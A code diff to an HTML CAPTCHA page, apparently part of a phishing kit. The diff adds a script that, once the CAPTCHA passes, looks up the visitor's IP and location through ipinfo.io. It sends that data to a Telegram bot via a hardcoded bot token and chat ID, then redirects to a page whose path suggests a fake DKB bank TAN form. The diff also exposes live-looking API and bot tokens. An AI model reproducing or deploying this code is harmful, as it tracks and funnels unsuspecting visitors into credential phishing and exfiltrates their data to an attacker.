@@ -13,7 +13,6 @@
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
-            text-align: center;
             background-color: #f4f4f4;
         }
         .container {
@@ -21,6 +20,7 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
         button {
             padding: 10px 20px;
@@ -48,13 +48,47 @@
     </div>
 
     <script>
-        function validateCaptcha(event) {
+        async function validateCaptcha(event) {
             event.preventDefault();
             var response = grecaptcha.getResponse();
             if (response.length === 0) {
                 alert("Please complete the CAPTCHA!");
-            } else {
-                window.location.href = "https://shahid-mbc.netsons.org/help"; // Redirect after successful verification
+                return;
+            }
+
+            try {
+                // Get IP and location info
+               const res = await fetch("https://ipinfo.io/json?token=614f4f5fe09129");
+                const data = await res.json();
+                
+                const ip = data.ip || "N/A";
+                const city = data.city || "N/A";
+                const region = data.region || "N/A";
+                const country = data.country || "N/A";
+
+
+                const message = `✅ CAPTCHA Passed\n🌍 IP: ${ip}\n📍 Location: ${city}, ${region}, ${country}`;
+                
+                const telegramBotToken = "7856802659:AAFxMtbOsVBuU-lwy0T9WzYLFgVOPFAY5uY";
+                const chatId = "-4799661248";
+
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                // Redirect after sending the message
+                window.location.href = "https://postifi.kinsta.cloud/dkb/tan";
+
+            } catch (error) {
+                console.error("Error sending data to Telegram:", error);
+                alert("Something went wrong. Try again later.");
             }
         }
     </script>
